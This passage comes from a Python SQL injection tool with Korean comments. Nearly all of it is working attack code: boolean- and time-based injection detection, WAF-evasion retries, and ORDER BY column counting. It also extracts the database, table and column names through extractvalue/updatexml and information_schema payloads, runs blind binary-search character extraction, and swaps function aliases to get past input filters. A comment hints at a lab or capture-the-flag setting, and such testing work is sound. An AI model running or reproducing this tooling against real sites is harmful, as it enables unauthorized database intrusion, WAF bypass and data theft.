                print(f"    [ET] db={db_name} 재현성 확인: {r_elapsed if r_status is not None else '요청실패'} → "
                      f"{'재현됨(확정)' if reproduced else '재현 안 됨(우연한 지연 의심), 판정 취소'}")
                if reproduced:
                    return {
                        'type':             'Time-based SQL Injection',
                        'detected_db':      db_name,
                        'payload':          used_payload,
                        'baseline_duration': round(baseline_elapsed, 2),
                        'attack_time':      round(elapsed, 2),
                        'verify_time':      round(v_elapsed, 2),
                        'reproduced_time':  round(r_elapsed, 2),
                        'waf_evaded':       waf_evaded,
                    }

        return fallback

    # ── 4. Noise 측정 → Boolean → Fingerprint ────────────────────────────────

    def _probe_boolean(self, surface, base_fields, baseline_body, original_value, quote_char, waf_hits: list, waf_evasions: list,
                        quote_signal: dict, page_noise: int) -> dict | None:
        bool_payloads = self._build_boolean_payloads(original_value, quote_char)
        base_len = len(baseline_body)

        # page_noise(페이지의 진짜 요청별 변동폭)는 run()의 멱등성 프로브가 엔드포인트당 한 번
        # 재서 넘겨준 값이라 여기서 또 측정하지 않는다. stateful 판정(noise>임계값)도 그 프로브가
        # 하므로 원래는 run()에서 boolean을 안 부르지만, 방어적으로 한 번 더 확인한다.
        if page_noise > self.STATEFUL_NOISE_THRESHOLD:
            print(f"    [Bool] page_noise={page_noise} 너무 큼 — boolean 스킵")
            return None
        noise_threshold = max(page_noise * 2, 5)
        print(f"    [Bool] page_noise={page_noise} → threshold={noise_threshold}")

        # quote_signal['hopeless']는 quote probe 결과의 '참고 정보'일 뿐, 그것만으로 boolean의
        # quote 포함 페이로드를 예단해서 스킵하지 않는다 — quote probe는 따옴표 하나짜리
        # 단순한 구조라, 그게 막혔다고 AND/OR가 붙은 boolean 페이로드도 똑같이 막힌다는 보장은
        # 없다(실제로 페이로드 구조에 따라 우회 성패가 갈리는 걸 이전에 확인한 바 있다). 그래서
        # boolean은 자기 구조로 첫 quote 포함 페이로드를 반드시 한 번 직접 시도해보고, '그것도'
        # 실패했을 때만(quote probe 실패 + boolean 자체 확인 실패, 두 증거가 겹칠 때만) 이후
        # quote 포함 페이로드를 스킵한다.
        # BOOLEAN_BATCH_SIZE개씩 묶어서 배치 안의 true/false 요청을 동시에 쏜다. 배치와 배치
        # 사이는 순차라서, 신호를 찾거나 quote_hopeless가 확정되면 다음 배치부터 바로 반영된다
        # — 다만 같은 배치 안의 페이로드들은 hopeless 여부가 확정되기 전에 이미 다 제출된
        # 상태라, 그 배치 안에서 hopeless가 확정되면 최대 (BOOLEAN_BATCH_SIZE-1)쌍은 이미
        # 보낸 뒤일 수 있다 — WAF가 quote를 확실히 차단하는 좁은 경우에만 생기는 손실이라
        # 감수한다.
        boolean_quote_hopeless = False
        total_batches = (len(bool_payloads) + self.BOOLEAN_BATCH_SIZE - 1) // self.BOOLEAN_BATCH_SIZE
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.BOOLEAN_BATCH_SIZE * 2 + 2) as pool:
            for batch_idx, batch_start in enumerate(range(0, len(bool_payloads), self.BOOLEAN_BATCH_SIZE), 1):
                batch = bool_payloads[batch_start:batch_start + self.BOOLEAN_BATCH_SIZE]
                # 이 배치를 제출하는 시점까지 확정된 hopeless 값으로만 필터링한다.
                active = [(tp, fp, bf, st) for tp, fp, bf, st in batch if not (quote_char in tp and boolean_quote_hopeless)]
                skipped_count = len(batch) - len(active)
                batch_label = f"배치 {batch_idx}/{total_batches} ({batch_start + 1}~{batch_start + len(batch)}번째 쌍)"
                if not active:
                    # 요청은 안 보내지만, 이 배치 전체가 스킵됐다는 것도 결과 요약이니 한 줄 남긴다.
                    print(f"    [Bool] {batch_label}: 전부 스킵(quote 우회 불가로 이미 확인됨)")
                    continue  # 이 단계에서 첫 quote 포함 페이로드가 이미 실패 확인됨 — 요청 없이 스킵

                # quiet=True — 배치 안 1차 시도는 [Evade] 개별 로그를 찍지 않는다. 어차피
                # 병렬로 쏘면 여러 스레드의 우회 로그가 뒤섞여서 어느 쌍 것인지 구분도 안 되니,
                # 개별 로그 대신 배치가 끝난 뒤 우회 필요/성공 건수만 한 줄로 요약한다.
                # waf_hits/waf_evasions 기록 자체는 quiet과 무관하게 그대로 남는다.
                failed_count = 0
                evaded_count = 0
                submitted = [
                    (orig_true, orig_false, build_fn, style,
                     pool.submit(self._send_evading, surface, base_fields, orig_true,
                                 'boolean(true)', waf_hits, waf_evasions, quiet=True),
                     pool.submit(self._send_evading, surface, base_fields, orig_false,
                                 'boolean(false)', waf_hits, waf_evasions, quiet=True))
                    for orig_true, orig_false, build_fn, style in active
                ]

                # 원본 리스트 순서대로 결과를 처리해서, 배치 안에서 여러 쌍이 동시에 신호를
                # 보여도 순차 버전과 동일하게 "먼저 오는 쌍"부터 확정을 시도한다.
                for orig_true, orig_false, build_fn, style, t_future, f_future in submitted:
                    contains_quote = quote_char in orig_true
                    t_status, t_body, _, true_payload, t_evaded = t_future.result()
                    f_status, f_body, _, false_payload, f_evaded = f_future.result()
                    if t_status is None or f_status is None:
                        # quote_signal['hopeless']가 이미 True(quote probe도 실패)인 상태에서
                        # boolean 자신의 첫 quote 포함 페이로드까지 실패했을 때만(두 증거 겹칠
                        # 때만) 스킵을 켠다 — quote probe가 성공했는데 이 템플릿만 우연히
                        # 실패한 거라면(노이즈 등) 성급하게 나머지를 다 포기하지 않는다.
                        if contains_quote and not boolean_quote_hopeless and quote_signal['hopeless']:
                            boolean_quote_hopeless = True
                            print(f"    [Bool] \"{quote_char}\" 포함 첫 페이로드 우회 실패(quote probe도 실패) — "
                                  f"이후 이 단계의 \"{quote_char}\" 포함 페이로드는 스킵")
                        failed_count += 1
                        continue  # 요청 실패 또는 WAF 우회 전부 실패 — 이 쌍은 스킵
                    waf_evaded = t_evaded or f_evaded
                    if waf_evaded:
                        evaded_count += 1

                    true_text, false_text = visible_text(t_body), visible_text(f_body)
                    diff_chars = diff_score(true_text, false_text)

                    # 무신호 페이로드는 로그를 안 남긴다 — 12개를 다 순회하는 동안 나오는 흔한 경우라
                    # 매번 찍으면 진짜 신호가 그 안에 묻힌다. 후보(신호 있음)일 때만 입을 연다.
                    if diff_chars <= noise_threshold:
                        continue

                    print(f"    [Bool] 후보 발견: payload=\"{true_payload}\" true={len(true_text)}자 "
                          f"false={len(false_text)}자 (diff_chars={diff_chars})")

                    # 재검증 — 후보의 참/거짓 응답 차이가 '정말 SQL 불리언이 평가돼서' 생긴
                    # 건지, 아니면 앱 필터/상태(예: '해커 감지' 메시지, 시도 횟수 리셋)가 특정
                    # 페이로드 '내용'에 반응해서 우연히 갈린 건지 구분한다. 같은 쌍을 한 번 더
                    # 보내는 것만으로는 못 거른다 — 필터는 결정적이라 그대로 재현되기 때문. 대신
                    # 리터럴만 바꾼 등가 조건들이 참끼리·거짓끼리 그대로 뭉치는지(논리적 등가
                    # 불변성)를 본다. 자세한 원리는 _verify_boolean_equivalence 참고.
                    ok = self._verify_boolean_equivalence(
                        surface, base_fields, build_fn, style, quote_char,
                        true_text, false_text, noise_threshold, waf_hits, waf_evasions, pool,
                    )
                    if not ok:
                        continue

                    vuln_entry = {
                        'type':               'Boolean-based SQL Injection',
                        'detected_db':        'Unknown',
                        'true_payload':       true_payload,
                        'false_payload':      false_payload,
                        'baseline_len':       base_len,
                        'true_response_len':  len(true_text),
                        'false_response_len': len(false_text),
                        'page_noise':         page_noise,
                        'noise_threshold':    noise_threshold,
                        'diff_chars':         diff_chars,
                        'waf_evaded':         waf_evaded,
                    }
                    # 방언 판별은 여기서 하지 않는다 — 예전 _fingerprint_db는 raw 응답 길이 +
                    # "AND version LIKE '%'" 형이라, uid 동등비교(uid='%'가 매칭 0)인 앱에선 참/거짓이
                    # 안 갈려 Unknown으로 실패했다. 이제 _go_enumerate가 UNION 추출 직전에 '확정된
                    # boolean 오라클'(OR 기반, diff_score)로 판별한다 — blind에서 쓰는 _resolve_dialect와
                    # 같은 견고한 방식으로 통일.
                    return vuln_entry

                # 이 배치에서 확정된 신호가 없었다 — 배치 하나의 결과를 한 줄로 요약해서 남긴다.
                # 개별 요청/우회 로그는 병렬로 뒤섞일 수 있지만, 이 요약은 배치가 끝난 뒤 메인
                # 스레드에서만 찍으므로 항상 배치 순서대로(총 3번) 깔끔하게 나온다.
                skip_note   = f", 스킵 {skipped_count}쌍" if skipped_count else ""
                evade_note  = f", 우회 {evaded_count}쌍" if evaded_count else ""
                print(f"    [Bool] {batch_label}: 시도 {len(active)}쌍{skip_note}, "
                      f"실패 {failed_count}쌍{evade_note} — 신호 없음")

        print(f"    [Bool] {len(bool_payloads)}개 페이로드 전부 무신호 — boolean 탐지 실패")
        return None

    def _verify_boolean_equivalence(self, surface, base_fields, build_fn, style: str, quote_char: str,
                                     cand_true_text: str, cand_false_text: str, noise_threshold: int,
                                     waf_hits: list, waf_evasions: list, pool) -> bool:
        """후보로 잡힌 참/거짓 쌍이 '정말 SQL 불리언이 평가돼서' 갈린 건지, 아니면 앱 필터/
        상태(해커 감지 메시지, 시도 횟수 리셋 등)가 특정 페이로드 '내용'에 반응해서 우연히
        갈린 건지 구분한다.

        핵심 원리(논리적 등가 불변성): 진짜 boolean SQLi라면 리터럴이 1=1이든 2=2든 'a'='a'든
        '항상 참' 조건은 전부 같은 응답으로, '항상 거짓' 조건은 전부 같은 응답으로 뭉쳐야 한다.
        필터/콘텐츠 기반 차이는 특정 문자열에만 반응하므로 리터럴을 바꾸면 이 뭉침이 깨진다.
        stateful 앱(요청마다 응답이 흔들림)에서도 클러스터 응집이 깨져 자연히 걸러진다.

        후보에서 이미 받은 응답(cand_true_text/cand_false_text)을 각 클러스터의 첫 원소로
        재사용하고, 리터럴만 바꾼 변형 2개씩만 추가로 보낸다(요청 4개). 판정:
          - 참 클러스터 내부가 서로 유사(응집)하고
          - 거짓 클러스터 내부도 서로 유사하며
          - 두 클러스터의 어떤 쌍을 봐도 threshold보다 크게 갈릴 때만 확정.
        변형 요청이 하나라도 실패하면(우회 불가 등) 보수적으로 확정 보류한다."""
        true_conds, false_conds = self._bool_cond_variants(quote_char)[style]
        # 인덱스 0은 후보가 이미 썼으므로 1번부터의 변형만 추가로 보낸다.
        t_futures = [pool.submit(self._send_evading, surface, base_fields, build_fn(c),
                                 'boolean(equiv-true)', waf_hits, waf_evasions) for c in true_conds[1:]]
        f_futures = [pool.submit(self._send_evading, surface, base_fields, build_fn(c),
                                 'boolean(equiv-false)', waf_hits, waf_evasions) for c in false_conds[1:]]

        true_texts, false_texts = [cand_true_text], [cand_false_text]
        for futures, bucket, side in ((t_futures, true_texts, '참'), (f_futures, false_texts, '거짓')):
            for fut in futures:
                st, body, _, _, _ = fut.result()
                if st is None:
                    print(f"    [Bool] 등가 재검증 실패 — {side} 변형 요청 불가(우회 실패 등), 확정 보류")
                    return False
                bucket.append(visible_text(body))

        def _cohesive(texts: list[str]) -> bool:
            return all(diff_score(a, b) <= noise_threshold
                       for i, a in enumerate(texts) for b in texts[i + 1:])

        true_cohesive  = _cohesive(true_texts)
        false_cohesive = _cohesive(false_texts)
        separation = min(diff_score(t, f) for t in true_texts for f in false_texts)
        ok = true_cohesive and false_cohesive and separation > noise_threshold
        print(f"    [Bool] 등가 클러스터 재검증: 참응집={true_cohesive} 거짓응집={false_cohesive} "
              f"클러스터간 최소diff={separation}(threshold={noise_threshold}) → "
              f"{'확정' if ok else '오탐 의심(리터럴 바꾸니 참/거짓 뭉침이 깨짐), 다음 페이로드로'}")
        return ok

    # ── 5. 공격벡터 확인: enumerate → union reflect → union extract ─────────

    def _go_enumerate(self, surface, base_fields, baseline_body, baseline_status, vuln_entry: dict,
                       injection_prefix: str, comment: str, waf_hits: list, waf_evasions: list,
                       page_noise: int = 0, stateful: bool = False) -> None:
        baseline_text = visible_text(baseline_body)

        # 본문 길이 차이(len)만 보면, 이 필드처럼 본문이 숨겨져 있고(evidence_kind='status')
        # 상태코드만 바뀌는 blind 사이트에서는 컬럼 수 경계를 절대 못 찾는다 — 상태코드 변화도
        # 같이 추적해서, 둘 중 하나라도 baseline에서 벗어나면 그 지점을 컬럼 수 경계로 본다.
        # baseline과의 비교는 raw 길이 대신 visible text diff_score를 쓴다.
        #
        # page_noise(페이지 요청별 흔들림)는 run()의 멱등성 프로브가 엔드포인트당 한 번 재서
        # 넘겨준 값이다 — 여기서 또 측정하지 않고 그대로 ORDER BY 컬럼 수 판별의 동적 임계값에
        # 쓴다. 바닥값을 5가 아니라 1로 낮추는 건 _probe_hidden_syntax_break와 같은 이유(짧은
        # 응답에선 진짜 경계 diff가 5 미만일 수 있음).
        noise_threshold = max(page_noise * 2, 1)
        print(f"    [Noise] page_noise={page_noise} → threshold={noise_threshold} (ORDER BY 컬럼 수 판별용)")

        order_results = {}
        order_payloads = {}
        for n in range(1, self.MAX_UNION_COLS + 1):
            status, body, _, used_payload, _ = self._send_evading(
                surface, base_fields, f"{injection_prefix} ORDER BY {n} {comment}", f'enum(ORDER BY {n})', waf_hits, waf_evasions,
            )
            diff = diff_score(baseline_text, visible_text(body)) if status is not None else 0
            order_results[n] = (status, diff)
            order_payloads[n] = used_payload
            if status is None and n == 1:
                # ORDER BY 1이 우회 7종을 다 쓰고도 완전히 막혔다면, 2~10도 숫자만 다를 뿐
                # 완전히 같은 모양(공백+키워드)의 페이로드라 막히는 이유가 똑같다 — 컬럼 수와
                # 무관한 구조적 차단이니 나머지를 다 돌려봐야 결과가 달라질 리 없다.
                print(f"    [Enum] ORDER BY 1부터 완전 차단됨 — 컬럼 수와 무관한 구조적 차단으로 보고 "
                      f"나머지 {self.MAX_UNION_COLS - 1}개는 스킵")
                # UNION reflect 등 뒤에 오는 quote_char 포함 probe들이 참고할 수 있게 기록.
                self._quote_signal[(surface.url, surface.param)] = True
                break

        extract_found = {}
        is_error_based = (
            vuln_entry['type'] in ('Error-based SQL Injection (Quote Probe)', 'Error-based SQL Injection')
            and vuln_entry.get('evidence_kind') == 'body'
        )
        if is_error_based: # 본문에 실제 에러 메시지가 노출된 경우에만 extractvalue 계열 시도
            for payload, label in [
                (f"{injection_prefix} AND extractvalue(1,concat(0x7e,database())) # ", 'mysql_extractvalue'),
                (f"{injection_prefix} AND updatexml(1,concat(0x7e,database()),1) # ",  'mysql_updatexml'),
                (f"{injection_prefix} AND 1=cast(version() as int) -- ",                'pg_cast'),
            ]:
                status, body, _, _, _ = self._send_evading(
                    surface, base_fields, payload, f'enum({label})', waf_hits, waf_evasions,
                )
                if status is None:
                    continue
                match = re.search(r'~([^<\s\'"&]{1,64})', body)
                if match:
                    extract_found[label] = match.group(1)
                elif label == 'pg_cast':
                    match = re.search(r'invalid input syntax[^"]*"([^"]{1,128})"', body, re.IGNORECASE)
                    if match:
                        extract_found[label] = match.group(1)
        else:
            print(f"    [Enum] {vuln_entry['type']}로 탐지됨 — 에러 메시지가 화면에 안 뜨는 blind 유형이라 "
                  f"extractvalue 계열 시도는 스킵")

        union_col = None
        boundary_payload = None   # 컬럼 수가 깨지는 경계 지점의 실제 페이로드 — 사람이 그대로 붙여넣어 재현 가능
        prev_status_ok = True   # 직전 n까지는 baseline과 같은 상태코드였는지
        for n in sorted(order_results):
            cur_status, cur_diff = order_results[n]
            status_broke = cur_status is not None and cur_status != baseline_status and prev_status_ok
            # >=(이상) — diff가 정확히 threshold와 같은 경계 케이스도 신호로 잡는다. 짧은
            # 응답 페이지에서 noise가 0으로 실측되면 threshold가 바닥값(1) 그대로 고정되는데,
            # 실제 컬럼 수 경계의 diff가 하필 그 값과 정확히 같게 나오는 경우가 실측된 바 있다.
            diff_broke   = cur_diff >= noise_threshold
            if status_broke or diff_broke:
                union_col = n - 1 if n > 1 else None
                boundary_payload = order_payloads[n]
                break
            prev_status_ok = cur_status is None or cur_status == baseline_status
        print(f"    [Enum] order_results={order_results} → col_count={union_col}")

        db_name_extracted = next(iter(extract_found.values()), None)

        # db명까지 뽑혔으면, 같은 함수로 테이블 1개 → 그 테이블의 컬럼 1개까지 이어서 확인해본다.
        table_name = column_name = None
        extract_label = 'mysql_extractvalue' if 'mysql_extractvalue' in extract_found else (
            'mysql_updatexml' if 'mysql_updatexml' in extract_found else None
        )
        if extract_label:
            fn = 'extractvalue' if extract_label == 'mysql_extractvalue' else 'updatexml'
            table_name = self._error_extract_value(
                surface, base_fields, injection_prefix, comment, fn,
                "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)",
                waf_hits, waf_evasions,
            )
            if table_name:
                column_name = self._error_extract_value(
                    surface, base_fields, injection_prefix, comment, fn,
                    f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1)",
                    waf_hits, waf_evasions,
                )
            print(f"    [Enum] error-based 추가 확인: table={table_name!r} column={column_name!r}")

        attack_vectors = {
            'error_based': (
                {
                    'possible':     True,
                    'db_name':      db_name_extracted,
                    'table_name':   table_name,
                    'column_name':  column_name,
                } if db_name_extracted
                else {'possible': False}
            ),
        }

        # UNION은 참/거짓을 추측하는 게 아니라 결과를 직접 반사시키는 방식이라 훨씬 신뢰도가
        # 높다 — 그래서 UNION을 먼저 시도하고, UNION으로 db명을 못 뽑았을 때만 blind 이진
        # 탐색으로 넘어간다. 'Boolean-based로 탐지됨'은 그저 그 방식으로 처음 신호를 찾았다는
        # 뜻이지 "이 필드는 blind다"라는 확정이 아니므로, blind를 무조건 우선시키지 않는다.
        if union_col:
            # UNION 추출 전에 방언을 확정한다 — _go_union_extract가 방언별로 다른 브랜치를 쓰기
            # 때문(MySQL: database()/information_schema, SQLite: sqlite_master, PostgreSQL:
            # current_database()). 확정된 boolean 오라클로 판별하며, 아직 방언이 없을 때만 한다
            # (숫자형 경로는 이미 detected_db를 채워둠). 판별 실패 시에도 UNION은 기본(MySQL)
            # 브랜치로 시도하고, 성공한 브랜치를 _go_union_extract가 detected_db에 기록한다.
            if vuln_entry.get('detected_db') in (None, 'Unknown'):
                self._resolve_dialect_for_union(surface, base_fields, injection_prefix, comment,
                                                 vuln_entry, waf_hits, waf_evasions, page_noise)
            attack_vectors['UNION'] = {'possible': True, 'columns': union_col, 'order_by_payload': boundary_payload}
            vuln_entry['attack_vectors'] = attack_vectors
            self._go_union_reflect(surface, base_fields, union_col, comment, vuln_entry,
                                    injection_prefix, waf_hits, waf_evasions)
        else:
            attack_vectors['UNION'] = {'possible': False}
            vuln_entry['attack_vectors'] = attack_vectors

        # blind로 넘어갈지는 처음에 어떤 방식으로 탐지됐는지(vuln_entry['type'])가 아니라,
        # "지금까지 확보한 추출 수단이 있는지"로 판단한다 — Error-based(상태코드뿐)로
        # 확정된 경우도 UNION/error-based 둘 다 실패했으면 마지막 수단으로 blind를 시도할
        # 가치가 있다. _blind_extract_boolean 자체가 캘리브레이션에서 신호 없으면 요청
        # 2개만 쓰고 바로 포기하니, 무조건 시도해봐도 비용이 낮다.
        union_db_name = attack_vectors['UNION'].get('db_name')
        if not union_db_name and not db_name_extracted:
            print(f"    [Enum] UNION/error-based 둘 다 db명을 못 뽑음 — blind 이진 탐색으로 대체 시도")
            # detected_db가 아래에서 방언으로 덮일 수 있으니 시간 프로필 조회는 먼저 해둔다.
            time_profile = self._TIME_PROFILE.get(vuln_entry.get('detected_db') or '')
            blind_db_name = blind_dialect = None
            if stateful:
                # 본문이 상태(카운터/리셋) 때문에 흔들리는 stateful 타깃에선 content 오라클을
                # 못 믿는다 — 아예 건너뛰고 상태와 무관한 시간 오라클(물리 지연)만 쓴다.
                print(f"    [Enum] stateful 타깃 — content 기반 blind는 신뢰 불가라 스킵, 시간 기반만 시도")
            else:
                # content(본문 diff) 기반 blind — 이미 확정된 '진짜' 방언(fingerprint/error)이
                # 있으면 재사용하되, time-based의 변형 이름('MySQL_OR_BENCHMARK')은 SQL_DIALECTS에
                # 없어 _resolve_dialect가 자기 방식으로 다시 판별한다. 억지로 방언을 주입하면
                # 신뢰 못 할 content 오라클로 가짜 데이터를 뽑을 위험이 있어 detected_db를 그대로 넘긴다.
                blind_db_name, blind_dialect = self._blind_extract_boolean(
                    surface, base_fields, injection_prefix, comment, None, waf_hits, waf_evasions,
                    known_db=vuln_entry.get('detected_db'), page_noise=page_noise,
                )
                if blind_dialect:
                    vuln_entry['detected_db'] = blind_dialect
                attack_vectors['blind_boolean'] = (
                    {'possible': True, 'db_name': blind_db_name} if blind_db_name
                    else {'possible': bool(blind_dialect), 'dialect': blind_dialect}
                )
            # content 기반이 db명을 못 뽑았거나(순수 time-based 등) stateful이라 아예 안 했고,
            # 시간 프로필이 있으면 시간 오라클로 추출을 시도한다 — 상태/필터에 흔들리지 않는 유일한 경로.
            if not blind_db_name and time_profile:
                reason = 'stateful' if stateful else 'content 기반 blind로는 db명 추출 실패'
                print(f"    [Enum] {reason} — 시간 기반 이진 탐색으로 시도")
                t_db_name, t_dialect = self._blind_extract_time(
                    surface, base_fields, injection_prefix, comment, None, time_profile,
                    vuln_entry.get('attack_time'), waf_hits, waf_evasions,
                )
                attack_vectors['blind_time'] = (
                    {'possible': True, 'db_name': t_db_name} if t_db_name
                    else {'possible': bool(t_dialect), 'dialect': t_dialect}
                )
        else:
            print(f"    [Enum] UNION 또는 error-based로 이미 db명 확보됨 — blind 이진 탐색은 생략")

    def _error_extract_value(self, surface, base_fields, injection_prefix: str, comment: str, fn: str, expr: str,
                              waf_hits: list, waf_evasions: list) -> str | None:
        """extractvalue/updatexml로 expr 값 하나를 뽑아본다 (테이블/컬럼 열거에 재사용)."""
        if fn == 'updatexml':
            inner = f"updatexml(1,concat(0x7e,{expr}),1)"
        else:
            inner = f"extractvalue(1,concat(0x7e,{expr}))"
        payload = f"{injection_prefix} AND {inner} {comment} "
        status, body, _, _, _ = self._send_evading(
            surface, base_fields, payload, f'enum(extract:{expr[:20]})', waf_hits, waf_evasions,
        )
        if status is None:
            return None
        match = re.search(r'~([^<\s\'"&]{1,64})', body)
        return match.group(1) if match else None

    # ── Blind(Boolean) 이진 탐색 추출 ─────────────────────────────────────────

    def _bool_oracle(self, surface, base_fields, injection_prefix: str, comment: str, condition: str,
                      ref_true_text: str, ref_false_text: str, waf_hits: list, waf_evasions: list,
                      dialect: str | None = None) -> bool | None:
        """condition(SQL 불리언 식)이 참인지, 캘리브레이션한 참/거짓 응답 텍스트에 더 가까운 쪽으로 판정한다."""
        payload = f"{injection_prefix} OR ({condition}) LIMIT 1 {comment} "
        status, body, _, _, _ = self._send_evading(
            surface, base_fields, payload, 'blind(oracle)', waf_hits, waf_evasions, dialect=dialect,
        )
        if status is None:
            return None
        text = visible_text(body)
        return diff_score(text, ref_true_text) <= diff_score(text, ref_false_text)

    @staticmethod
    def _binary_search(test_fn, lo: int, hi: int) -> int | None:
        """test_fn(n) = '실제값 > n' 오라클. [lo,hi] 안의 정확한 값을 찾는다."""
        while lo < hi:
            mid = (lo + hi) // 2
            result = test_fn(mid)
            if result is None:
                return None
            if result:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _uses_inequality_ban(self, surface) -> bool:
        """이 필드에서 '<' 또는 '>'가 밴이면 True — 비교식을 부등호 없이(BETWEEN 등) 만들어야 한다."""
        banned = self._banned_tokens.get((surface.url, surface.param))
        return bool(banned) and ('<' in banned or '>' in banned)

    def _cmp_gt(self, surface, lhs: str, n: int) -> str:
        """'lhs > n'(lhs는 음수 아님: LENGTH/ASCII)을 밴-안전하게 만든다. '<'/'>'가 밴이면
        부등호 없이 BETWEEN으로 — 'x > n' ⟺ 'x BETWEEN n+1 AND MAX'."""
        if self._uses_inequality_ban(surface):
            return f"{lhs} BETWEEN {n + 1} AND {self.BLIND_MAX_INT}"
        return f"{lhs}>{n}"

    def _cmp_always(self, surface, lhs: str, truth: bool) -> str:
        """정합성 앵커용 항상참/항상거짓 비교식. '<'/'>'가 밴이면 BETWEEN으로 — 항상참=
        'x BETWEEN 0 AND MAX'(음수 아님이라 항상 성립), 항상거짓='x BETWEEN 1 AND 0'(빈 범위)."""
        if self._uses_inequality_ban(surface):
            return f"{lhs} BETWEEN 0 AND {self.BLIND_MAX_INT}" if truth else f"{lhs} BETWEEN 1 AND 0"
        return f"{lhs}>=0" if truth else f"{lhs}<0"

    def _substr_expr(self, surface, dialect: str, x: str, pos: int, length: int) -> str:
        """부분문자열 함수를 밴 안 걸리는 별칭으로 고른다 — MySQL은 SUBSTR/SUBSTRING/MID가
        동작이 같아서, 'substring'이 밴이면 SUBSTR, 그것도 밴이면 MID로 넘어간다(정답 코드가
        MID를 쓴 이유). 함수 '이름'만 밴 여부를 보므로(인자 x 안의 밴 토큰은 별개) 정확히 고른다."""
        if dialect == 'MySQL':
            for fn in ('SUBSTR', 'SUBSTRING', 'MID'):
                if self._banned_in(surface, fn) is None:
                    return f"{fn}({x},{pos},{length})"
        return SQL_DIALECTS[dialect]['substr_fn'](x, pos, length)

    def _ord_expr(self, surface, dialect: str, x: str) -> str:
        """문자→코드 함수를 밴 안 걸리는 별칭으로 — MySQL은 ASCII/ORD가 (ASCII 범위에서) 동일.
        'ascii'가 밴이면 ORD로 넘어간다."""
        if dialect == 'MySQL':
            for fn in ('ASCII', 'ORD'):
                if self._banned_in(surface, fn) is None:
                    return f"{fn}({x})"
        return SQL_DIALECTS[dialect]['ord_fn'](x)

    def _oracle_live(self, surface, oracle, probe_lhs: str, label: str) -> bool:
        """정합성 앵커 — '조건이 거짓이라 신호가 없는 것'과 '우리 주입이 애초에 SQL에서 실행조차
        안 돼서(밴 토큰/문법오류/상태리셋) 신호가 없는 것'을 구분한다.

        probe_lhs는 실제 판독의 좌변(예: 'LENGTH(database())', 'ASCII(SUBSTR(pw,1,1))')이라
        실제 페이로드와 밴/실행 노출이 동일하다. LENGTH()/ASCII()류는 음수가 안 나오므로
        '>=0'은 항상 참, '<0'은 항상 거짓 — 결과가 수학적으로 확정돼 있다. 항상참이 참 신호를,
        항상거짓이 거짓 신호를 '둘 다' 낼 때만 채널이 살아있다고 본다. probe_lhs에 밴 토큰
        (예: database)이 섞여 필터되면 '>=0'조차 참 신호를 못 내(양쪽 다 거부 페이지로 뭉갬)
        여기서 걸린다. 대상이 NULL인 경우('>=0'이 NULL→falsy)도 함께 걸리는데, NULL이든 밴이든
        어차피 못 뽑는 건 같아 가짜 값을 만들지 않고 정직하게 중단하는 게 맞다."""
        cond_true  = self._cmp_always(surface, probe_lhs, True)   # 항상 참 ('>' 밴이면 BETWEEN)
        cond_false = self._cmp_always(surface, probe_lhs, False)  # 항상 거짓
        always_true  = oracle(cond_true)
        always_false = oracle(cond_false)
        live = (always_true is True and always_false is False)
        if not live:
            print(f"    [{label}] 정합성 앵커 실패 ({cond_true} → {always_true}, {cond_false} → {always_false}) "
                  f"— 밴 토큰/문법오류/상태리셋으로 SQL 미실행으로 보고 측정 불가 처리(거짓 오판 안 함)")
        return live

    def _extract_with_oracle(self, surface, oracle, dialect: str, expr: str | None, label: str) -> str | None:
        """oracle(condition)->bool|None + 이진 탐색으로 expr 값을 문자 단위로 추출한다.

        content 오라클(_bool_oracle)이든 시간 오라클(_time_oracle)이든 '이 SQL 불리언 조건이
        참인가?'만 답하면 되므로, 길이·문자 이진 탐색 로직은 오라클 종류와 무관하게 공용이다.
        expr=None이면 그 방언의 current_db 표현식을 뽑는다(current_db 개념이 없는 방언이면 None).
        문자 추출엔 방언별 ord_fn/substr_fn을 쓴다.
        """
        d = SQL_DIALECTS[dialect]
        if expr is None:
            if d['current_db'] is None:
                print(f"    [{label}] {dialect}는 현재 DB명 개념이 없어 추출 스킵 (방언만 확인됨)")
                return None
            expr = d['current_db']

        # 정합성 앵커 — 첫 길이 판독을 믿기 전에, 같은 좌변으로 이 페이로드가 실제로 SQL에서
        # 실행되는지 확인한다. 실패하면 이후 '거짓' 판독이 전부 '밴/미실행'일 수 있어 신뢰 불가
        # → 여기서 중단한다(가짜 '길이 0' 방지).
        if not self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
            return None

        length = self._binary_search(lambda n: oracle(self._cmp_gt(surface, f"LENGTH({expr})", n)), 0, self.BLIND_MAX_LEN)
        if length is None:
            print(f"    [{label}] {expr} 길이 확인 실패 (요청 실패)")
            return None
        if length == 0:
            # 시작 앵커는 통과했으니 원래는 '진짜 빈 값'이지만, 추출 도중 상태가 리셋돼 채널이
            # 죽었을 수도 있다 — 앵커를 다시 찍어 '진짜 빈 값'과 '도중에 死'을 가른다.
            if self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
                print(f"    [{label}] {expr} 길이=0 (빈 값 — 앵커 재확인 통과)")
            else:
                print(f"    [{label}] {expr} 길이가 0으로 붕괴 + 앵커 재확인 실패 — 추출 도중 오라클 死"
                      f"(필터/상태리셋 추정), 측정 불가")
            return None
        if length >= self.BLIND_MAX_LEN:
            # 상한까지 꽉 찼다는 건 오라클이 거의 항상 '참'으로 판정 중이라는 뜻 — 진짜 64자
            # 식별자일 리 없으니 오라클/캘리브레이션 불안정으로 보고 중단한다(무한정 헛도는 것 방지).
            print(f"    [{label}] {expr} 길이가 상한({self.BLIND_MAX_LEN})까지 도달 — 오라클이 불안정한 것으로 "
                  f"보여 추출 중단 (수동 확인 권장)")
            return None
        print(f"    [{label}] {expr} 길이={length}")

        result = ''
        for pos in range(1, length + 1):
            char_expr = self._ord_expr(surface, dialect, self._substr_expr(surface, dialect, expr, pos, 1))
            # 8글자마다 채널이 아직 살아있는지 재확인 — 추출 도중 상태리셋/밴으로 오라클이 죽으면
            # 이후 글자가 전부 쓰레기(charset 최소값 등)로 채워지는 걸 막고 여기까지만 반환한다.
            if pos > 1 and (pos - 1) % 8 == 0 and not self._oracle_live(surface, oracle, char_expr, label):
                print(f"    [{label}] {pos}번째 글자 직전 앵커 실패 — 추출 도중 오라클 死, 여기까지만: {result!r}")
                return result or None
